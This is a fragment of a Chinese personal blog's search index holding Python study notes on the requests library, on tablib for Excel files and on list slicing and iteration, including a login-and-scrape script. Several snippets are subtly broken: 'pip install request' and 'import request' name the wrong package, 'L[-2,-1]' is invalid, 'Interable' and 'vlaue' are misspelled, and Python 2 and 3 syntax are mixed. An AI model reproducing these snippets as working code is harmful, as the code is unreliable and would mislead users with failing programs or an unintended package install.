            <tag> 生产力工具,WindowsTerminal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>requests库学习</title>
      <link href="/2019/12/13/requests%E5%BA%93%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/12/13/requests%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="安装-amp-amp-使用"><a href="#安装-amp-amp-使用" class="headerlink" title="安装&amp;&amp;使用"></a>安装&amp;&amp;使用</h2><p>安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install request</span><br></pre></td></tr></table></figure><h4 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h4><h5 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line"><span class="comment"># get请求</span></span><br><span class="line">r = requests.get(<span class="string">'http://39.97.111.215:18001/'</span>)</span><br><span class="line"><span class="comment"># post请求</span></span><br><span class="line">r = requests.post(<span class="string">'http://httpbin.org/post'</span>, data = &#123;<span class="string">'key'</span>:<span class="string">'value'</span>&#125;)</span><br><span class="line"><span class="comment"># 其他请求</span></span><br><span class="line">r = requests.put(<span class="string">'http://httpbin.org/put'</span>, data = &#123;<span class="string">'key'</span>:<span class="string">'value'</span>&#125;)</span><br><span class="line">r = requests.delete(<span class="string">'http://httpbin.org/delete'</span>)</span><br><span class="line">r = requests.head(<span class="string">'http://httpbin.org/get'</span>)</span><br><span class="line">r = requests.options(<span class="string">'http://httpbin.org/get'</span>)</span><br></pre></td></tr></table></figure><h5 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;<span class="string">'key1'</span>: <span class="string">'value1'</span>, <span class="string">'key2'</span>: <span class="string">'value2'</span>&#125;</span><br><span class="line"><span class="comment"># get: http://httpbin.org/get?key2=value2&amp;key1=value1</span></span><br><span class="line">r = requests.get(<span class="string">"http://httpbin.org/get"</span>, params=payload)</span><br><span class="line"><span class="comment"># post</span></span><br><span class="line">r = requests.post(<span class="string">"http://httpbin.org/get"</span>, params=payload)</span><br></pre></td></tr></table></figure><h5 id="定制响应头"><a href="#定制响应头" class="headerlink" title="定制响应头"></a>定制响应头</h5><p> 为请求添加 HTTP 头部，传递一个 <code>dict</code> 给 <code>headers</code> 参数，例如指定content-type</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">'https://api.github.com/some/endpoint'</span></span><br><span class="line">headers = &#123;<span class="string">'user-agent'</span>: <span class="string">'my-app/0.0.1'</span>&#125;</span><br><span class="line">r = requests.get(url, headers=headers)</span><br></pre></td></tr></table></figure><h4 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h4><h5 id="文本响应"><a href="#文本响应" class="headerlink" title="文本响应"></a>文本响应</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">r = requests.get(&apos;https://api.github.com/events&apos;)</span><br><span class="line">r.text</span><br></pre></td></tr></table></figure><p>​        请求发出后，Requests 会基于 HTTP 头部对响应的编码作出有根据的推测。当你访问 <code>r.text</code> 之时，Requests 会使用其推测的文本编码。你可以找出 Requests 使用了什么编码，并且能够使用 <code>r.encoding</code> 属性来改变它： </p><p>​        如果改变了编码，每当你访问 <code>r.text</code> ，Request 都将会使用 <code>r.encoding</code> 的新值。 </p><h5 id="二进制响应内容"><a href="#二进制响应内容" class="headerlink" title="二进制响应内容"></a>二进制响应内容</h5><p> 以字节的方式访问请求响应体，对于非文本请求： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.content</span><br></pre></td></tr></table></figure><p> Requests 会自动为你解码 <code>gzip</code> 和 <code>deflate</code> 传输编码的响应数据。 </p><p>例如，以请求返回的二进制数据创建一张图片，你可以使用如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line">i = Image.open(BytesIO(r.content))</span><br></pre></td></tr></table></figure><h5 id="JSON-响应"><a href="#JSON-响应" class="headerlink" title="JSON 响应"></a>JSON 响应</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'https://api.github.com/events'</span>)</span><br><span class="line">r.json()</span><br></pre></td></tr></table></figure><h5 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.headers</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">'content-encoding'</span>: <span class="string">'gzip'</span>,</span><br><span class="line">    <span class="string">'transfer-encoding'</span>: <span class="string">'chunked'</span>,</span><br><span class="line">    <span class="string">'connection'</span>: <span class="string">'close'</span>,</span><br><span class="line">    <span class="string">'server'</span>: <span class="string">'nginx/1.0.4'</span>,</span><br><span class="line">    <span class="string">'x-runtime'</span>: <span class="string">'148ms'</span>,</span><br><span class="line">    <span class="string">'etag'</span>: <span class="string">'"e1ca502697e5c9317743dc078f67693f"'</span>,</span><br><span class="line">    <span class="string">'content-type'</span>: <span class="string">'application/json'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Coolie"><a href="#Coolie" class="headerlink" title="Coolie"></a>Coolie</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://example.com/some/cookie/setting/url'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(url)</span><br><span class="line"><span class="comment"># 获取cookie</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.cookies[<span class="string">'example_cookie_name'</span>]</span><br><span class="line"><span class="string">'example_cookie_value'</span></span><br><span class="line"><span class="comment"># 发送cookie</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/cookies'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cookies = dict(cookies_are=<span class="string">'working'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(url, cookies=cookies)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line"><span class="string">'&#123;"cookies": &#123;"cookies_are": "working"&#125;&#125;'</span></span><br></pre></td></tr></table></figure><h4 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h4><p>默认情况下，除了 HEAD, Requests 会自动处理所有重定向。</p><p>可以使用响应对象的 <code>history</code> 方法来追踪重定向。</p><p><a href="http://2.python-requests.org/zh_CN/latest/api.html#requests.Response.history" target="_blank" rel="noopener"><code>Response.history</code></a> 是一个 <a href="http://2.python-requests.org/zh_CN/latest/api.html#requests.Response" target="_blank" rel="noopener"><code>Response</code></a> 对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。</p><p> 可以通过 <code>allow_redirects</code> 参数禁用重定向处理： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(<span class="string">'http://github.com'</span>, allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h4 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h4><p> 告诉 requests 在经过以 <code>timeout</code> 参数设定的秒数时间之后停止等待响应。基本上所有的生产代码都应该使用这一参数。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.get(<span class="string">'http://github.com'</span>, timeout=<span class="number">0.001</span>)</span><br></pre></td></tr></table></figure><h4 id="错误和异常"><a href="#错误和异常" class="headerlink" title="错误和异常"></a>错误和异常</h4><p>遇到网络问题（如：DNS 查询失败、拒绝连接等）时，Requests 会抛出一个 <code>ConnectionError</code> 异常。</p><p>如果 HTTP 请求返回了不成功的状态码， <a href="http://2.python-requests.org/zh_CN/latest/api.html#requests.Response.raise_for_status" target="_blank" rel="noopener"><code>Response.raise_for_status()</code></a> 会抛出一个 <code>HTTPError</code> 异常。</p><p>若请求超时，则抛出一个 <code>Timeout</code> 异常。</p><p>若请求超过了设定的最大重定向次数，则会抛出一个 <code>TooManyRedirects</code> 异常。</p><p>所有Requests显式抛出的异常都继承自 <code>requests.exceptions.RequestException</code> 。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>利用<code>requests</code>实现自动登录，获取信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">login = <span class="string">'http://flag.re:5000/login'</span></span><br><span class="line">show_time = <span class="string">'http://flag.re:5000/show_time'</span></span><br><span class="line">proxies = &#123;<span class="string">'http'</span>: <span class="string">'http://localhost:8080'</span>&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'phone'</span>: <span class="string">'xxxx'</span>,</span><br><span class="line">    <span class="string">'password'</span>: <span class="string">'xxxx'</span>,</span><br><span class="line">    <span class="string">'submit'</span>: <span class="string">'submit'</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">''</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> re.search(<span class="string">r'&lt;input id="csrf_token" name="csrf_token" type="hidden" value="(.*?)"&gt;'</span>, content).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">data[<span class="string">'csrf_token'</span>] = get_token(session.get(login).content)</span><br><span class="line">s = session.post(login, data=data)</span><br><span class="line"></span><br><span class="line">r = session.get(show_time, cookies=s.cookies)</span><br><span class="line">names = re.findall(<span class="string">r'&lt;i class="fa fa-user-secret"&gt;&lt;/i&gt;(.*?)&lt;/td&gt;'</span>, r.content)</span><br><span class="line">tmp = re.findall(<span class="string">r'&lt;td&gt; &lt;i class="fa fa-user-secret"&gt;(.*?)&lt;td&gt;&lt;i class="fa fa-lightbulb-o"&gt;&lt;/i&gt;'</span>, r.content, re.S)</span><br><span class="line"></span><br><span class="line">units = [re.search(<span class="string">r'&lt;td&gt;(.*?)&lt;/td&gt;'</span>, x, re.S).group(<span class="number">1</span>) <span class="keyword">for</span> x <span class="keyword">in</span> tmp]</span><br><span class="line"></span><br><span class="line">decode_names = [name.decode(r.encoding) <span class="keyword">for</span> name <span class="keyword">in</span> names]</span><br><span class="line">decode_units = [unit.decode(r.encoding) <span class="keyword">for</span> unit <span class="keyword">in</span> units]</span><br><span class="line">name_unit = dict(zip(decode_names, decode_units))</span><br><span class="line"><span class="keyword">for</span> name,unit <span class="keyword">in</span> name_unit.items():</span><br><span class="line">    <span class="keyword">print</span> name + <span class="string">' '</span> + unit</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用tablib处理excel</title>
      <link href="/2019/12/12/%E4%BD%BF%E7%94%A8tablib%E5%A4%84%E7%90%86excel/"/>
      <url>/2019/12/12/%E4%BD%BF%E7%94%A8tablib%E5%A4%84%E7%90%86excel/</url>
      
        <content type="html"><![CDATA[<h2 id="tablib模块"><a href="#tablib模块" class="headerlink" title="tablib模块"></a>tablib模块</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install tablib</span><br></pre></td></tr></table></figure><h3 id="基础用法"><a href="#基础用法" class="headerlink" title="基础用法"></a>基础用法</h3><h4 id="读数据"><a href="#读数据" class="headerlink" title="读数据"></a>读数据</h4><p>1、使用import_set导入excel文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'demo.xls'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = tablib.import_set(f.read(), <span class="string">'xls'</span>)</span><br><span class="line">    <span class="keyword">print</span> data</span><br></pre></td></tr></table></figure><h4 id="行列数据操作"><a href="#行列数据操作" class="headerlink" title="行列数据操作"></a>行列数据操作</h4><h5 id="获取行"><a href="#获取行" class="headerlink" title="获取行"></a>获取行</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一行第一列</span></span><br><span class="line">a[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"><span class="comment"># 第一行指定列</span></span><br><span class="line">a.dict[<span class="number">0</span>][<span class="string">'url'</span>]</span><br><span class="line"><span class="comment"># 前两行</span></span><br><span class="line">a[:<span class="number">2</span>]</span><br></pre></td></tr></table></figure><h5 id="获取列"><a href="#获取列" class="headerlink" title="获取列"></a>获取列</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[<span class="string">'url'</span>]</span><br></pre></td></tr></table></figure><h5 id="插入行"><a href="#插入行" class="headerlink" title="插入行"></a>插入行</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'demo.xls'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = tablib.import_set(f.read(), <span class="string">'xls'</span>)</span><br><span class="line">    <span class="comment"># 添加行</span></span><br><span class="line">    data.append([<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>])</span><br><span class="line">    <span class="comment"># 在指定行插入</span></span><br><span class="line">    data.insert(<span class="number">2</span>, [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>])</span><br><span class="line"><span class="comment"># 注意：模式需要用二进制模式 wb</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">u'demo2.xlsx'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data.xlsx)</span><br></pre></td></tr></table></figure><h5 id="插入列"><a href="#插入列" class="headerlink" title="插入列"></a>插入列</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在最后添加</span></span><br><span class="line">a.append_col([<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'d'</span>], header=<span class="string">'actual_result'</span>)</span><br><span class="line"><span class="comment"># 在指定位置添加列</span></span><br><span class="line">a.insert_col(<span class="number">3</span>,[<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>], header=<span class="string">'actual_result'</span>)</span><br></pre></td></tr></table></figure><h5 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改某一行</span></span><br><span class="line">a[<span class="number">0</span>] = (<span class="string">'x'</span>, <span class="string">'o'</span>, <span class="string">'p'</span>)</span><br><span class="line"><span class="comment"># 修改某个具体数据</span></span><br><span class="line">a._data[<span class="number">0</span>][<span class="number">0</span>] = <span class="string">'wo'</span></span><br></pre></td></tr></table></figure><h4 id="创建Dataset对象"><a href="#创建Dataset对象" class="headerlink" title="创建Dataset对象"></a>创建Dataset对象</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方式1</span></span><br><span class="line">dataset1 = tablib.Dataset()</span><br><span class="line">dataset1.headers = [<span class="string">'id'</span>,<span class="string">'name'</span>,<span class="string">'age'</span>,<span class="string">'sex'</span>]</span><br><span class="line">dataset1.append([<span class="string">'1'</span>,<span class="string">'朱宇'</span>,<span class="string">'21'</span>,<span class="string">'male'</span>])</span><br><span class="line"><span class="comment"># 方式2</span></span><br><span class="line">header2 = [<span class="string">'id'</span>,<span class="string">'name'</span>,<span class="string">'password'</span>]</span><br><span class="line">data = [</span><br><span class="line">    [<span class="string">'1'</span>,<span class="string">'杨鹏'</span>,<span class="string">'123'</span>],</span><br><span class="line">    [<span class="string">'2'</span>,<span class="string">'代松柏'</span>,<span class="string">'567'</span>],</span><br><span class="line">]</span><br><span class="line">dataset2 = tablib.Dataset(headers=header2,*data)</span><br></pre></td></tr></table></figure><h4 id="转换Dataset格式"><a href="#转换Dataset格式" class="headerlink" title="转换Dataset格式"></a>转换Dataset格式</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dataset2.json    <span class="comment"># 转成json格式</span></span><br><span class="line">dataset2.xls     <span class="comment"># 转成xls格式</span></span><br><span class="line">dataset2.csv    <span class="comment"># 转成csv格式</span></span><br></pre></td></tr></table></figure><h4 id="保存为文件"><a href="#保存为文件" class="headerlink" title="保存为文件"></a>保存为文件</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dataset = tablib.Dataset(headers=headers, *datas)</span><br><span class="line"><span class="comment"># 注意：模式需要用二进制模式 wb</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">u'总成绩.xlsx'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(dataset.xlsx)</span><br></pre></td></tr></table></figure><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Date: 2019.12.12</span></span><br><span class="line"><span class="comment"># Author: t0ng</span></span><br><span class="line"><span class="keyword">import</span> tablib</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> List, Union</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取姓名-&gt;单位信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> io.open(<span class="string">'name.txt'</span>, <span class="string">'r'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> names:</span><br><span class="line">        r = [i.split() <span class="keyword">for</span> i <span class="keyword">in</span> names.readlines()]</span><br><span class="line">        <span class="keyword">return</span> dict(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取总成绩</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">()</span>:</span></span><br><span class="line">    unit = get_unit()</span><br><span class="line">    <span class="keyword">with</span> io.open(<span class="string">'chengji.txt'</span>, <span class="string">'r'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        r = [i.split() <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines()]</span><br><span class="line">        data = sorted(r, key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>], reverse=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">for</span> index, v <span class="keyword">in</span> enumerate(data):</span><br><span class="line">            v.insert(<span class="number">0</span>, str(index + <span class="number">1</span>))</span><br><span class="line">            v.insert(<span class="number">2</span>, unit[v[<span class="number">1</span>]])</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    datas = get_data()</span><br><span class="line">    headers = [<span class="string">u'序号'</span>, <span class="string">u'姓名'</span>, <span class="string">u'单位'</span>, <span class="string">u'成绩'</span>]</span><br><span class="line">    dataset = tablib.Dataset(headers=headers, *datas)</span><br><span class="line">    <span class="comment"># dataset.insert_col(1, range(1, 22), '序号2')</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">u'总成绩.xlsx'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(dataset.xlsx)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python高级特性</title>
      <link href="/2019/12/11/python%E9%AB%98%E7%BA%A7%E7%89%B9%E6%80%A7/"/>
      <url>/2019/12/11/python%E9%AB%98%E7%BA%A7%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h3 id="Python高级特性"><a href="#Python高级特性" class="headerlink" title="Python高级特性"></a>Python高级特性</h3><h4 id="切片（slice）"><a href="#切片（slice）" class="headerlink" title="切片（slice）"></a>切片（slice）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>]</span><br></pre></td></tr></table></figure><p>​    取前三个元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L[<span class="number">0</span>:<span class="number">3</span>]</span><br></pre></td></tr></table></figure><p><code>L[-1]</code>可以取倒数第一个元素，可以倒数切片，如取后两个元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L[<span class="number">-2</span>,<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><h5 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建0-99的数列</span></span><br><span class="line">L = list(range(<span class="number">100</span>))</span><br><span class="line"><span class="comment"># 取前十个数</span></span><br><span class="line">L[:<span class="number">10</span>]</span><br><span class="line"><span class="comment"># 后十个数</span></span><br><span class="line">L[<span class="number">-10</span>:]</span><br><span class="line"><span class="comment"># 前11到20个数</span></span><br><span class="line">L[<span class="number">10</span>:<span class="number">20</span>]</span><br><span class="line"><span class="comment"># 前十个数，每两个取一个</span></span><br><span class="line">L[:<span class="number">10</span>:<span class="number">2</span>]</span><br><span class="line"><span class="comment"># 所有数，没5个取一个</span></span><br><span class="line">L[::<span class="number">5</span>]</span><br><span class="line"><span class="comment"># 复制一个list</span></span><br><span class="line">L[:]</span><br></pre></td></tr></table></figure><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><ul><li><p>元组（tuple）也是一种list，唯一区别时tuple不可变，因此也可以切片。</p></li><li><p>字符串<code>&#39;aaa&#39;</code>也可以看作list，每个字符就是一个元素，因此也可切片。</p></li></ul><h4 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h4><p>给定一个<strong>列表、元组、字符串等</strong>，可以用<code>for</code>循环遍历</p><h5 id="dict迭代"><a href="#dict迭代" class="headerlink" title="dict迭代"></a>dict迭代</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">'a'</span>:<span class="number">1</span>, <span class="string">'b'</span>:<span class="number">2</span>, <span class="string">'c'</span>:<span class="number">3</span>&#125;</span><br><span class="line"><span class="comment"># 遍历key</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> d:</span><br><span class="line">    print(key)</span><br><span class="line"><span class="comment"># 遍历value</span></span><br><span class="line"><span class="keyword">for</span> vlaue <span class="keyword">in</span> d.values():</span><br><span class="line">    print(value)</span><br><span class="line"><span class="comment"># 同时遍历key value</span></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> d.items():</span><br><span class="line">    <span class="keyword">print</span> k,v</span><br></pre></td></tr></table></figure><h5 id="如何判断对象是否可迭代"><a href="#如何判断对象是否可迭代" class="headerlink" title="如何判断对象是否可迭代"></a>如何判断对象是否可迭代</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Iterable</span><br><span class="line"><span class="comment"># 判断字符串是否可迭代 True</span></span><br><span class="line">isinstance(<span class="string">'abc'</span>, Interable)</span><br><span class="line"><span class="comment"># 判断list是否可迭代 True</span></span><br><span class="line">isinstance([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], Interable) </span><br><span class="line"><span class="comment"># 判断整数是否可迭代 False</span></span><br><span class="line">isinstance(<span class="number">123</span>, Interable)</span><br></pre></td></tr></table></figure><h5 id="把一个list变成索引-元素对"><a href="#把一个list变成索引-元素对" class="headerlink" title="把一个list变成索引-元素对"></a>把一个list变成索引-元素对</h5><p> Python内置的<code>enumerate</code>函数可以把一个list变成索引-元素对，这样就可以在<code>for</code>循环中同时迭代索引和元素本身： </p><figure class="highlight python"><table><tr><td 